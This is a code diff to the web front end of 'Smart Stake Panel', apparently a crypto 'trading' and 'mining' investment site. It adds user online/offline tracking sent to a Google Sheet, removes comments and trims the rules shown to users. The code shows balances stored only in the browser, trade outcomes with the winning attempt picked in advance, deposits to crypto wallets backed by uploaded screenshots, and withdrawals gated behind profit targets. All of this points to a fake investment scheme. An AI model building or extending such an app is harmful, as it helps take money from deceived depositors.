@@ -124,7 +124,6 @@
         .copy-btn { background: #0284c7; color: white; border: none; padding: 6px 10px; border-radius: 4px; font-size: 10.5px; font-weight: bold; cursor: pointer; }
         .warning-box { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5; font-size: 10.5px; padding: 8px; border-radius: 6px; margin: 10px 0; text-align: left; line-height: 1.4; }
 
-        /* Professional Profile Styling */
         .profile-container { text-align: center; }
         .profile-avatar-box {
             width: 70px; height: 70px; border-radius: 50%; background: linear-gradient(135deg, #0284c7, #38bdf8);
@@ -190,18 +189,15 @@
         </div>
     </div>
 
-    <!-- Live Real-Time Gold Price -->
     <div class="card">
         <p id="active-asset-title">GOLD (XAU/USD) REAL-TIME</p>
         <h1 id="active-asset-price">Fetching...</h1>
     </div>
 
-    <!-- Trade Main Action -->
     <div id="trade-section">
         <button class="btn" id="trade-main-btn" onclick="openTradeModal()">📈 TRADE (1m CHART)</button>
     </div>
 
-    <!-- 2x2 Stats Grid -->
     <div class="stats-grid">
         <div class="metric-card card-lime"><div class="metric-title">Current Amount</div><div class="metric-value" id="val-current">$0.00</div></div>
         <div class="metric-card card-lightblue"><div class="metric-title">Deposit Amount</div><div class="metric-value" id="val-deposit">$0.00</div></div>
@@ -216,7 +212,6 @@
 
     <button class="btn-yellow-withdraw" onclick="handleWithdrawalClick()">💰 WITHDRAW FUNDS</button>
 
-    <!-- Daily Trade History -->
     <div class="history-card">
         <div style="font-weight:800; font-size:14px; margin-bottom:6px;">📈 DAILY TRADE HISTORY</div>
         <table class="history-table">
@@ -291,6 +286,40 @@
     fetchLiveGoldPrice();
     setInterval(fetchLiveGoldPrice, 3000);
 
+    /* ---------------- STATUS UPDATE & HEARTBEAT TRACKING ---------------- */
+    function sendUserStatusUpdate(status) {
+        if (!currentUser || !currentUser.email) return;
+        
+        const payload = JSON.stringify({
+            action_type: "update_status",
+            email: currentUser.email,
+            user_status: status
+        });
+
+        if (status === "Offline" && navigator.sendBeacon) {
+            navigator.sendBeacon(GOOGLE_SCRIPT_URL, payload);
+        } else {
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload
+            }).catch(err => console.error("Status Ping Error:", err));
+        }
+    }
+
+    // Send "Online" ping every 60 seconds
+    setInterval(() => {
+        if (currentUser && currentUser.email) {
+            sendUserStatusUpdate("Online");
+        }
+    }, 60000);
+
+    // Send "Offline" immediately when app/tab is closed
+    window.addEventListener('pagehide', function() {
+        sendUserStatusUpdate("Offline");
+    });
+
     function checkAuth() {
         if (currentUser) {
             document.getElementById('auth-screen').style.display = 'none';
@@ -300,6 +329,7 @@
             loadBalances();
             renderTradeHistory();
             checkTradeLockStatus();
+            sendUserStatusUpdate("Online");
         } else {
             document.getElementById('auth-screen').style.display = 'block';
             document.getElementById('main-dashboard').style.display = 'none';
@@ -323,7 +353,7 @@
         return 'REF' + Math.abs(hash).toString(16).toUpperCase().substring(0, 6);
     }
 
-    /* ---------------- 1. REGISTRATION DATA SUBMISSION ---------------- */
+    /* ---------------- REGISTRATION ---------------- */
     async function handleRegistration() {
         const fname = document.getElementById('reg-fname').value.trim();
         const lname = document.getElementById('reg-lname').value.trim();
@@ -340,7 +370,6 @@
         let myRefCode = generateReferralCode(email);
         let fullName = `${fname} ${lname}`.trim();
 
-        // Send registration to Google Sheet
         try {
             fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
@@ -380,7 +409,6 @@
     }
 
     /* ---------------- TRADE FUNCTIONALITY ---------------- */
-
     function getTradeState() {
         const defaultState = { attemptsLeft: 3, winningAttempt: Math.floor(Math.random() * 3) + 1, lockUntil: 0 };
         return JSON.parse(localStorage.getItem(`tradeState_${currentUser?.email}`)) || defaultState;
@@ -523,8 +551,7 @@
         checkTradeLockStatus();
     }
 
-    /* ---------------- DAILY TRADE HISTORY MANAGEMENT ---------------- */
-
+    /* ---------------- TRADE HISTORY ---------------- */
     function getTradeHistory() {
         return JSON.parse(localStorage.getItem(`tradeHistory_${currentUser?.email}`)) || [];
     }
@@ -562,8 +589,7 @@
         container.innerHTML = html;
     }
 
-    /* ---------------- 2. WITHDRAWAL DATA SUBMISSION ---------------- */
-
+    /* ---------------- WITHDRAWAL ---------------- */
     function handleWithdrawalClick() {
         let currBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
 
@@ -619,7 +645,6 @@
         const subBtn = document.getElementById('with-sub-btn');
         if (subBtn) { subBtn.disabled = true; subBtn.innerText = "Submitting..."; }
 
-        // Send Withdrawal Data to Google Sheet
         try {
             fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
@@ -654,8 +679,7 @@
         showPopup("💰 Withdrawal Pending", successNotice);
     }
 
-    /* ---------------- 3. DEPOSIT DATA SUBMISSION ---------------- */
-
+    /* ---------------- DEPOSIT ---------------- */
     function openDepositModal() {
         const depContent = `
             <div style="font-size:11px; color:#cbd5e1; margin-bottom:10px;">Select your network and copy the deposit wallet address below:</div>
@@ -711,7 +735,6 @@
 
         let screenshotBase64 = "";
 
-        // Helper function to read image as Base64 string
         if (fileInput && fileInput.files.length > 0) {
             try {
                 screenshotBase64 = await new Promise((resolve, reject) => {
@@ -725,7 +748,6 @@
             }
         }
 
-        // Send Deposit Request to Google Sheet
         try {
             fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
@@ -753,8 +775,7 @@
         showPopup("✅ Verification Pending", notice);
     }
 
-    /* ---------------- RULES MODAL ---------------- */
-
+    /* ---------------- RULES & MODALS ---------------- */
     function openRulesModal() {
         const rulesContent = `
             <div style="font-size:12px; font-weight:bold; color:#38bdf8; margin-bottom:10px;">Smart Stake Panel — Terms, Rules & Guidelines</div>
@@ -777,36 +798,13 @@
             <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
             • <strong>Minimum Funding Requirement:</strong> To activate the core earning engine, a minimum deposit of $100 is required.<br>
             • <strong>Smart Mining Activation:</strong> Once the $100 deposit is approved, the central "Mine" button will be unlocked on your dashboard. Users must activate/click "Mine" daily to harvest dynamic profits.<br>
-            • <strong>Network & Address Verification:</strong> Always double-check the deposit wallet address and selected blockchain network (e.g., TRC20, BEP20) before sending funds. Deposits sent to incorrect addresses or incompatible networks cannot be recovered.<br>
-            • <strong>Proof of Payment:</strong> Users must upload an authentic, clear screenshot/transaction hash (TxID). Providing manipulated or duplicate screenshots will lead to permanent account suspension.<br>
-            • <strong>Approval Timeline:</strong> Manual and automated verification takes between 1 to 6 hours to reflect in your panel balance.
-            </div>
-
-            <div style="font-weight:bold; color:#fbbf24; font-size:11px; margin-top:10px; margin-bottom:4px;">3. Dynamic Daily Profit & Trading Structure</div>
-            <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
-            • <strong>Real-Market Execution:</strong> Smart Stake Panel operates via genuine live copy-trading algorithms and expert execution. Returns are not fixed. Daily profits fluctuate in real time according to market conditions.<br>
-            • <strong>Capital Protection Model:</strong> Capital is managed under strict risk-management parameters to protect the principal balance while generating sustainable market returns.
-            </div>
-
-            <div style="font-weight:bold; color:#fbbf24; font-size:11px; margin-top:10px; margin-bottom:4px;">4. Withdrawal Lifecycle & Capital Lock Policy</div>
-            <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
-            • <strong>First Cycle Completion:</strong> To maintain strategy liquidity, initial deposits undergo a full cycle until cumulative profits equal the initial capital base.<br>
-            • <strong>Standard Minimum Withdrawal:</strong> Once the initial milestone is reached, subsequent regular withdrawals have a minimum threshold of $50.<br>
-            • <strong>Early Capital Exit / Account Termination:</strong> If a user requests an early account closure before completing the full operational cycle, they are permitted to withdraw all accumulated profits generated up to that date, and the account will be closed.<br>
-            • <strong>Payout Timelines:</strong> All withdrawal requests are processed within a 24 to 48 hour security clearance window.
-            </div>
-
-            <div style="font-weight:bold; color:#fbbf24; font-size:11px; margin-top:10px; margin-bottom:4px;">5. Security, Fair Use & Platform Compliance</div>
-            <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
-            • <strong>Single Account Policy:</strong> Only one account is permitted per user/IP. Creating multiple accounts to manipulate referral systems will result in an immediate freeze of balances.<br>
-            • <strong>Network Transaction Fees:</strong> Standard blockchain gas/network fees apply to external withdrawals and are deducted automatically at the time of payout.<br>
-            • <strong>Support & Dispute Resolution:</strong> For unresolved deposits or payout queries exceeding designated timeframes, users must contact official customer support.
+            • <strong>Network & Address Verification:</strong> Always double-check the deposit wallet address and selected blockchain network (e.g., TRC20, BEP20) before sending funds.<br>
+            • <strong>Proof of Payment:</strong> Users must upload an authentic, clear screenshot/transaction hash (TxID).<br>
+            • <strong>Approval Timeline:</strong> Manual and automated verification takes between 1 to 6 hours.
             </div>
         `;
         showPopup("📜 Rules & Guidelines", rulesContent);
     }
-
-    /* ---------------- REFERRALS MODAL ---------------- */
 
     function openReferralsModal() {
         let appDomain = window.location.href.split('?')[0];
@@ -826,8 +824,6 @@
         `;
         showPopup("🤝 Referral Program", refHtml);
     }
-
-    /* ---------------- PROFILE MODAL ---------------- */
 
     function openProfileModal() {
         let initial = (currentUser.fname ? currentUser.fname.charAt(0) : "U").toUpperCase();
@@ -865,6 +861,7 @@
 
     function handleSignOut() {
         if (confirm("Are you sure you want to sign out from Smart Stake Panel?")) {
+            sendUserStatusUpdate("Offline");
             localStorage.removeItem('traderUser');
             currentUser = null;
             closePopup();
